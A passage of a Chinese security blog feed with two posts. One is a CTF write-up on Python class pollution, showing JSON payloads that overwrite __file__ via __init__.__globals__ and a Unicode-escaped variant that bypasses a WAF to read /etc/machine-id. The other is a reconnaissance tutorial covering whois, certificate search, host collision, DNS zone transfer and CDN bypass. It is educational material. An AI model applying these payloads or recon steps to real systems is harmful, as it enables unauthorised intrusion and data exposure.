class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;The username or password is incorrect,Login Failed,Please log in again!!!&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.cannot_be_bypassed(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Congratulations,The username and password is correct,Login Success!!!&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;The username or password is incorrect,Login Failed,Please log in again!!!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hey bro,May be you should check your inputs,because it contains malicious data,Please don&#x27;t hack me~~~ :) :) :)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br></pre></td></tr></table></figure><br>我们可以看到其在/路由下打开了<code>__file__</code>我们可以尝试污染这个<code>__file__</code>属性,在登陆页面调用了合并函数，这也就导致了有污染的入口。我们在看一下会发现其将<code>__init__</code>进行了重写这也就导致了我们可以使用<code>__init__.__globals__</code>来污染全局变量，即<code>__file__</code><br>正常注册时我们传的json表单应该为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;2&quot;&#125;</span><br></pre></td></tr></table></figure><br>这并没有什么问题，但是我们可以在上面加点小东西。即可以利用<code>&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;__file__&quot;:&quot;要修改的文件路径&quot;&#125;&#125;&#125;</code>来进行污染<br>payload<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;要修改的文件路径&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>由于这题加了waf所以我们可以使用unicode绕过。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:1,&quot;password&quot;:2,&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;:&#123;      &quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;:&#123;&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;:   &quot;/etc/machine-id&quot;&#125;&#125;,&quot;ykg6xtt2j2l&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="其他模块的污染"><a href="#其他模块的污染" class="headerlink" title="其他模块的污染"></a>其他模块的污染</h1><p>这次的校赛并没有打到对于其他的他模块的变量的污染。可见学长还是手下留了情。<br>在全局变量的前提下，是我们都在入口文件中的类对象或者属性来进行操作的，但是如果我们操作的位置在入口文件中，而目标对象并不在入口文件当中，这时候我们就需要对其他加载过的模块来获取了</p>
<h2 id="import加载获取："><a href="#import加载获取：" class="headerlink" title="import加载获取："></a>import加载获取：</h2><p>一般python都是通过import来对模块进行导入的，那么我门要污染improt导入的对象只需要重新定向即可<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> DEMO</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="comment">#// 递归合并函数，将dst字典内的数据合并至sec内</span></span><br><span class="line">merge(payload,instance)</span><br></pre></td></tr></table></figure><br>DEMO<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b=1</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><br>像上面的python代码导入了应该DEMO那么我们该如何对DEMO里的变量进行污染呢？很简单只要做一个重定向即可了。<br>payload<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;__init__&quot;:</span><br><span class="line">    &#123;&quot;__globals__&quot;:</span><br><span class="line">        &#123;&quot;DEMO&quot;:</span><br><span class="line">                &#123;&quot;b&quot;:2&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br><br>可以看到在我们运行后输出值变为了2，这就是因为我们先获取了全局变量，在修改DEMO中的值，将b修改为2.</p>
<h2 id="sys模块加载获取："><a href="#sys模块加载获取：" class="headerlink" title="sys模块加载获取："></a>sys模块加载获取：</h2><p>在许多的环境中导入模块并不是简单的利用import进行导入同级目录下的文件，更多的是利用第三方模块和内置模块进行导入。这时候我们就无法简单的利用上面的payload进行重定向了，我们需要使用sys这个模块进行定向。<br>sys模块中有一个modules属性，这个属性可以加详细这个程序运行时导入的所有模块。所有我们可以通过他来进行重定向。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> DEMO</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="comment">#// 递归合并函数，将dst字典内的数据合并至sec内</span></span><br><span class="line"><span class="built_in">print</span>(DEMO.a)</span><br><span class="line">instance =A()</span><br><span class="line">payload=&#123;<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;sys&quot;</span>:&#123;<span class="string">&quot;modules&quot;</span>:&#123;<span class="string">&quot;DEMO&quot;</span>:&#123;<span class="string">&quot;a&quot;</span>:<span class="number">2</span>&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">merge(payload,instance)</span><br><span class="line"><span class="built_in">print</span>(DEMO.a)</span><br></pre></td></tr></table></figure>
<p>可以看到我们的payload时先定位到sys模块的modules属性再修改DEMO的内容。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;sys&quot;:&#123;&quot;modules&quot;:&#123;&quot;DEMO&quot;:&#123;&quot;a&quot;:2&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="获取sys模块"><a href="#获取sys模块" class="headerlink" title="获取sys模块"></a>获取sys模块</h3><p>我们知道了可以使用sys模块来重定位，但是我相信我们都有一个疑问就是如何获取sys模块。</p>
<h4 id="通过加载器loader获取sys"><a href="#通过加载器loader获取sys" class="headerlink" title="通过加载器loader获取sys"></a>通过加载器loader获取sys</h4><p>我们可以通过loader加载器来获取sys模块的<br>loader加载器在python中的作用是为实现模块加载而设计的类，其在importlib这一内置模块中有具体实现。而importlib模块下所有的py文件中均引入了sys模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过<code>loader.__init__.__globals__[&#39;sys&#39;]</code>来获取到sys模块，然后再获取到我们想要的模块。<br>那么现在我们的问题就是如何获取loader模块。<br>在Python中，<strong>loader</strong>是一个内置的属性，包含了加载模块的loader对象，Loader对象负责创建模块对象，通过<strong>loader</strong>属性，我们可以获取到加载特定模块的loader对象。<br>loader获取到sys<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&lt;模块名&gt;.__spec__.__init__.__globals__[&#x27;sys&#x27;]获取到sys模块</span><br><span class="line">2.&lt;模块名&gt;.__spec__.loader.__init__.__globals__[&#x27;sys&#x27;]</span><br></pre></td></tr></table></figure><br>这个文章写的我是有点头疼的，对python的了解太少了，导致许多方法和属性搞不清楚，而且这个漏洞的概念也很多，头疼</p>
]]></content>
      <categories>
        <category>python</category>
        <category>原型链污染</category>
      </categories>
      <tags>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>初探外网信息收集</title>
    <url>/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="作为一个web手一个好的信息收集能力是必须的，无论是渗透测试还是打比赛都少不了信息搜集"><a href="#作为一个web手一个好的信息收集能力是必须的，无论是渗透测试还是打比赛都少不了信息搜集" class="headerlink" title="作为一个web手一个好的信息收集能力是必须的，无论是渗透测试还是打比赛都少不了信息搜集"></a>作为一个web手一个好的信息收集能力是必须的，无论是渗透测试还是打比赛都少不了信息搜集</h1><h1 id="主域名信息"><a href="#主域名信息" class="headerlink" title="主域名信息"></a>主域名信息</h1><h2 id="IPC备案"><a href="#IPC备案" class="headerlink" title="IPC备案"></a>IPC备案</h2><p>备案查询是为了查询改单位注册了多少网站。</p>
<h3 id="查询网站"><a href="#查询网站" class="headerlink" title="查询网站"></a>查询网站</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://beian.miit.gov.cn/#/Integrated/recordQuery</span><br></pre></td></tr></table></figure>
<img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png" class="" title="alt text">
<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>通过whois信息可以获取注册人的关键信息。如注册商、联系人、联系邮箱、联系电话，也可以对注册人、邮箱、电话反查域名，也可以通过搜索引擎进一步挖掘域名所有人的信息。深入可社工、可漏洞挖掘利用。</p>
<h3 id="查询网站："><a href="#查询网站：" class="headerlink" title="查询网站："></a>查询网站：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">国内：</span><br><span class="line">站长之家</span><br><span class="line">http://whois.chinaz.com</span><br><span class="line"></span><br><span class="line">IP138网站</span><br><span class="line">https://site.ip138.com/</span><br><span class="line"></span><br><span class="line">域名信息查询-腾讯云</span><br><span class="line">https://whois.cloud.tencent.com/</span><br><span class="line"></span><br><span class="line">ICANN LOOKUP</span><br><span class="line">https://lookup.icann.org/</span><br><span class="line"></span><br><span class="line">狗狗查询</span><br><span class="line">https://www.ggcx.com/main/integrated</span><br><span class="line"></span><br><span class="line">国外：</span><br><span class="line">Bugscanner</span><br><span class="line">http://whois.bugscaner.com</span><br><span class="line"></span><br><span class="line">国外BGP</span><br><span class="line">https://bgp.he.net</span><br><span class="line"></span><br><span class="line">who.is</span><br><span class="line">https://who.is/</span><br></pre></td></tr></table></figure>
<h2 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h2><p>目标可能存在多个域名绑定于同一ip上，通过ip反查可以获取到其他域名信息。比如旁站。</p>
<p>通过获取目标真实IP后，进行反查的旁站更真实。<br>查询站点需复杂性，单一的站点会有反查不出信息的可能。</p>
<h3 id="查询网站-1"><a href="#查询网站-1" class="headerlink" title="查询网站"></a>查询网站</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iP或域名查询</span><br><span class="line">https://site.ip138.com/</span><br><span class="line"></span><br><span class="line">同IP网站查询，同服务器网站查询 - 站长工具</span><br><span class="line">https://stool.chinaz.com/same</span><br><span class="line"></span><br><span class="line">Dnslytics</span><br><span class="line">https://dnslytics.com/</span><br></pre></td></tr></table></figure>
<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>shodan<br>bing<br>fofa</p>
<h2 id="通过证书查询"><a href="#通过证书查询" class="headerlink" title="通过证书查询"></a>通过证书查询</h2><p>通过查询该网站下挂着的SSL证书一般就可以判断改网站是归属于哪个单位。也可以通过证书来寻找子域名。</p>
<h3 id="查询网站-2"><a href="#查询网站-2" class="headerlink" title="查询网站"></a>查询网站</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://crt.sh/ 输入域名即可</span><br></pre></td></tr></table></figure>
<h3 id="搜索引擎-1"><a href="#搜索引擎-1" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fofa</span><br><span class="line">cert=&quot;baidu&quot;  --&gt; 搜索https或者imaps中带有百度的资产</span><br><span class="line">cert.subject=&quot;xxx&quot;  --&gt; 搜索证书的持有者为xxx的资产</span><br><span class="line">cert.issuer=&quot;xxx&quot;  --&gt; 搜索证书的颁发者为xxx的资产</span><br><span class="line">cert.is_valid=true/false  --&gt; 验证证书的有效性</span><br></pre></td></tr></table></figure>
<h2 id="host碰撞"><a href="#host碰撞" class="headerlink" title="host碰撞"></a>host碰撞</h2><p>想要理解什么是host碰撞首先要知道什么是反向代理。</p>
<h3 id="反向代理是什么"><a href="#反向代理是什么" class="headerlink" title="反向代理是什么"></a>反向代理是什么</h3><p>反向代理是nginx/Apache的一个功能，其作用是隐藏真实的后端服务器信息，提供负载平衡、安全过滤、缓存等功能，并增强网络安全性。<br>当客户端发来了请求如果开启了反向代理会先将请求发送到反向代理服务器也就是Nginx和Apache，再由反向代理服务器来发送到后端服务器。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>一般反向代理发送的后端服务器都是由host头来决定的。而当数据包的 host 头替换为某个域名时在访问该反代服务器的 ip, 如果 nginx/Apache 的反向代理的 host 配置没删除，就会把请求转发到内网对应的 host 业务服务器上，接着返回该业务的信息，实现本该隐藏的业务访问<br>简单点就是： nginx/Apache 的反向代理的 host 配置没删除，当我们访问这个ip时仍然会先发给nginx/Apache再由nginx/Apache来发送给规定host的后端服务器。如果配置有host没删除又与用户的请求头的host相同，那么nginx/Apache就会代理将请求发到该内网web。<a href="https://www.wangan.com/p/11v7471117136181">host碰撞的原理</a></p>
<h3 id="什么时候存在"><a href="#什么时候存在" class="headerlink" title="什么时候存在"></a>什么时候存在</h3><p>1 业务通过 DNS 解析到外网，后面删除了 A 记录 (但是 nginx/Apache 的反向代理还没删除)</p>
<p>2 测试业务 (不对外开放的业务，只流传于开发或是测试使用)</p>
<h3 id="碰撞工具"><a href="#碰撞工具" class="headerlink" title="碰撞工具"></a>碰撞工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/cckuailong/hostscan</span><br><span class="line">https://github.com/fofapro/Hosts_scan</span><br><span class="line">https://github.com/smxiazi/host_scan</span><br></pre></td></tr></table></figure>
<h2 id="DNS共享记录"><a href="#DNS共享记录" class="headerlink" title="DNS共享记录"></a>DNS共享记录</h2><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名，即保存了IP地址和域名的相互映射关系。域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。也正是因为DNS的存在，访问相应服务只需记住域名，不需要记住无规则的ip地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">记录类型	说明</span><br><span class="line">A 记录	        将域名指向一个 IP 地址（外网地址）。</span><br><span class="line">CNAME 记录	将域名指向另一个域名，再由另一个域名提供 IP 地址（外网地址）。</span><br><span class="line">MX 记录	        电子邮件交换记录，记录一个邮件域名对应的IP地址，设置邮箱，让邮箱能收到邮件。</span><br><span class="line">NS 记录	        域名服务器记录，记录该域名由哪台域名服务器解析。如将子域名交给其他 DNS 服务商解析。</span><br><span class="line">AAAA 记录	将域名指向一个 IPv6 地址。</span><br><span class="line">SRV 记录	用来标识某台服务器使用了某个服务，常见于微软系统的目录管理。</span><br><span class="line">TXT 记录	对域名进行标识和说明，绝大多数的 TXT 记录是用来做 SPF 记录（反垃圾邮件）。</span><br></pre></td></tr></table></figure>
<h3 id="利用价值"><a href="#利用价值" class="headerlink" title="利用价值"></a>利用价值</h3><p>可以通过查询共享DNS服务器的主机来获取到相关的域名，一般多是用于自建DNS服务器。如果是公开的DNS服务器，那么查询的效果将会特别差。</p>
<h3 id="使用nslookup来进行查看目标是否存在NS服务器"><a href="#使用nslookup来进行查看目标是否存在NS服务器" class="headerlink" title="使用nslookup来进行查看目标是否存在NS服务器"></a>使用nslookup来进行查看目标是否存在NS服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com 8.8.8.8</span><br></pre></td></tr></table></figure>
<p>将获取到的NS服务器带入 <a href="https://hackertarget.com/find-shared-dns-servers/">https://hackertarget.com/find-shared-dns-servers/</a> 进行查询</p>
<h1 id="子域名的信息"><a href="#子域名的信息" class="headerlink" title="子域名的信息"></a>子域名的信息</h1><p>子域名一般是父级域名的下一级。一般企业主站域名的防护都是重点，安全级别较高，突破难度较大，而企业可能会有数十个甚至更多的子域名应用，因为数量众多，安全因素和成本投入多，相应的防护也没有那么及时有效。子域名往往是攻击突破口，通过子域名发现更多的可能性或是进行迂回攻击。</p>
<h2 id="子域名信息点"><a href="#子域名信息点" class="headerlink" title="子域名信息点"></a>子域名信息点</h2><p>子域名包含一些常见资产类型：办公系统，邮箱系统，论坛，商城等。而其他管理系统，网站管理后台等较少出现在子域名中。<br>一般情况下，相同类型漏洞可能存在同一组织的不同的域名/应用程序中。<br>子域名系统维护成本、用户群体等，一般少于主域名，会存在一些版本迭代、配置不安全、弱密码账号管理策略等。<br>子域名探测发现更多的服务，增加漏洞发现的可能性。</p>
<h2 id="枚举爆破"><a href="#枚举爆破" class="headerlink" title="枚举爆破"></a>枚举爆破</h2><p>要说简单粗暴还是子域名枚举爆破，通过不断的拼接字典中的子域名前缀去枚举域名的A记录进行DNS解析，如果成功解析说明子域名存在。如xxx.com拼接前缀test组合成test.xxx.com，再对其进行验证。但是域名如果使用泛解析的话，则会导致所有的域名都能成功解析，使得子域名枚举变得不精准。<br>我们使用nslookup来验证<br>泛解析<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4.png" class="" title="alt text"><br>正常解析<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5.png" class="" title="alt text"><br>我们可以看到我们使用nslookup来解析wiki时即使其前一段子域名为随便乱打的也会被解析<br>但是当正常解析时如百度，我们会发现无法解析成功。</p>
<h2 id="DNS域传送"><a href="#DNS域传送" class="headerlink" title="DNS域传送"></a>DNS域传送</h2><p>DNS服务器分为：主服务器、备份服务器和缓存服务器。</p>
<p>在主备服务器之间同步数据库，需要使用“DNS域传送”的一种DNS事务。域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。</p>
<p>若DNS配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</p>
<p>错误配置：只要收到axfr请求就进行域传送，刷新数据。</p>
<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询nameserver  </span><br><span class="line">nslookup -type=ns fafu.edu.cn 8.8.8.8  </span><br><span class="line"># 指定nameserver，列举域名信息  </span><br><span class="line">nslookup  </span><br><span class="line"># Server 命令参数设定查询将要使用的DNS服务器  </span><br><span class="line">server cloudy.dnspod.net   </span><br><span class="line">#  Ls命令列出某个域中的所有域名  </span><br><span class="line">ls fafu.edu.cn</span><br></pre></td></tr></table></figure>
<img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.png" class="" title="alt text">
<p>我们可以看到其无法传送出来即没有这个漏洞</p>
<h3 id="Dig"><a href="#Dig" class="headerlink" title="Dig"></a>Dig</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 找到NS服务器</span><br><span class="line">dig nhtc.wiki ns</span><br><span class="line"># 发送axfr请求 </span><br><span class="line">dig axfr @cloudy.dnspod.net nhtc.wiki</span><br></pre></td></tr></table></figure>
<p>一般情况下，DNS服务器配置都正常，关闭了域传送或设置白名单，利用率低。推荐交给自动化。</p>
<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>我们可以通过证书来对子域名进行查询，一般挂取该单位证书的一般是子域名<br>因为证书透明性是开放架构，可以检测由证书颁发机构错误颁发的 SSL 证书，也可以识别恶意颁发证书的证书颁发机构，且任何人都可以构建或访问，CA证书又包含了域名、子域名、邮箱等敏感信息，价值就不言而喻了<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://crt.sh/</span><br><span class="line">https://www.entrust.com/ct-search/</span><br><span class="line">https://developers.facebook.com/tools/ct/</span><br><span class="line">https://spyse.com/search/certificate</span><br><span class="line">https://sslmate.com/certspotter/api/</span><br></pre></td></tr></table></figure></p>
<h2 id="域名存活检测"><a href="#域名存活检测" class="headerlink" title="域名存活检测"></a>域名存活检测</h2><h1 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h1><h2 id="1-绕过CDN获取真实ip"><a href="#1-绕过CDN获取真实ip" class="headerlink" title="1. 绕过CDN获取真实ip"></a>1. 绕过CDN获取真实ip</h2><p>CDN是IP信息探测或打点必不可绕过的一个话题。当目标使用了CDN加速，获取到的目标ip不一定是真实ip。所以通常在实施端口、漏扫等测试之前，需判断下是否真实IP，是否使用了CDN或其他代理等等，避免无效操作、蜜罐、非目标点。<br>常见CDN服务商<br>一、国内 CDN 服务商</p>
<p>阿里云 CDN<br>百度云 CDN<br>七牛云 CDN<br>又拍云 CDN<br>腾讯云 CDN<br>Ucloud<br>360 CDN<br>网宿科技<br>ChinaCache<br>帝联科技<br>二、国外 CDN 服务商</p>
<p>CloudFlare<br>StackPath<br>Fastly<br>Akamai<br>CloudFront<br>Edgecast<br>CDNetworks<br>Google Cloud CDN<br>CacheFly<br>Keycdn<br>Udomain<br>CDN77</p>
<h2 id="CDN判断"><a href="#CDN判断" class="headerlink" title="CDN判断"></a>CDN判断</h2><h3 id="多ping"><a href="#多ping" class="headerlink" title="多ping"></a>多ping</h3><p>通过多地ping目标域名，如果没有使用CDN，只会显示一个IP地址，或者双线接入情况的两个不同运营商ip。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ping.chinaz.com/</span><br><span class="line">https://ping.aizhan.com/</span><br><span class="line">http://www.webkaka.com/Ping.aspx</span><br><span class="line">https://www.host-tracker.com/v3/check/</span><br></pre></td></tr></table></figure><br>通过多地ping目标域名，如果没有使用CDN，只会显示一个IP地址，或者双线接入情况的两个不同运营商ip。<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/7.png" class="" title="alt text"></p>
<h3 id="nslookup-1"><a href="#nslookup-1" class="headerlink" title="nslookup"></a>nslookup</h3><p>获取到的DNS域名解析结果中返回多个ip的，一般都是存在CDN服务。<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/8.png" class="" title="alt text"></p>
<h3 id="header头信息"><a href="#header头信息" class="headerlink" title="header头信息"></a>header头信息</h3><p>请求响应包header头中是否存在cdn服务商信息<br>报错信息<br>若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN</p>
<h3 id="在线检测工具"><a href="#在线检测工具" class="headerlink" title="在线检测工具"></a>在线检测工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cdnplanet.com/tools/cdnfinder/</span><br><span class="line">https://tools.ipip.net/cdn.php</span><br><span class="line">https://whatsmycdn.com/</span><br></pre></td></tr></table></figure>
<img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/10.png" class="" title="alt text">
<p>我们可以看到当查询的网站存在CDN加速就会查到很多奇怪的东西。</p>
<h3 id="IP反查-1"><a href="#IP反查-1" class="headerlink" title="IP反查"></a>IP反查</h3><p>看看是否会查到大量不相干的域名<br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/9.png" class="" title="alt text"><br>可以看到baidu应该是使用了CDN加速</p>
<h2 id="获取真实IP"><a href="#获取真实IP" class="headerlink" title="获取真实IP"></a>获取真实IP</h2><h3 id="dns历史绑定记录"><a href="#dns历史绑定记录" class="headerlink" title="dns历史绑定记录"></a>dns历史绑定记录</h3><p>查询域名历史解析记录，可能会存在未使用cdn之前的真实ip记录：<br>首先查看一个域名是否使用了CDN加速<br>然后使用在线工具查看历史ip<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://viewdns.info/iphistory/?domain=</span><br><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://securitytrails.com/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">https://site.ip138.com/www.xxx.com/</span><br></pre></td></tr></table></figure><br><img src="/2024/03/12/%E5%88%9D%E6%8E%A2%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/11.png" class="" title="alt text"><br>使用<br><code>view-source:</code>一个个查看ip如果回显源码则为真实ip</p>
]]></content>
      <categories>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>攻防</tag>
        <tag>外网信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题</title>
    <url>/2024/09/04/%E5%88%B7%E9%A2%98/</url>
